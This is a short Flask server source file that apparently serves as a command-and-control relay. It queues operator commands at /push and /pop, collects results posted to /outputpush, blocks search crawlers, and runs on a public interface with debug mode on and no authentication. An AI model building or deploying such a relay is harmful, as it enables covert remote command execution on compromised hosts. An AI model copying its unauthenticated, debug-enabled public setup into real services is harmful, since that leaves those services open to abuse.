import os

from flask import Flask, Response, request

app = Flask(__name__)

commands = [];
outputs = [];

@app.route('/push')
def push():
    commands.append(request.args.get("cmd"))
    return ""

@app.route('/peek')
def peek():
    return Response('\n'.join(commands), mimetype="text/plain")

@app.route('/pop')
def pop():
    ret = Response('\n'.join(commands), mimetype="text/plain")
    commands.clear()
    return ret;

@app.route('/outputpush', methods=["POST"])
def outputpush():
    outputs.append(request.get_data().decode('utf-8'))
    return ""

@app.route('/output')
def output():
    ret = Response('\n\n'.join(outputs), mimetype="text/plain")
    outputs.clear()
    return ret;

@app.route('/robots.txt')
def robots():
    res = app.make_response('User-agent: *\nDisallow: /')
    res.mimetype = 'text/plain'
    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
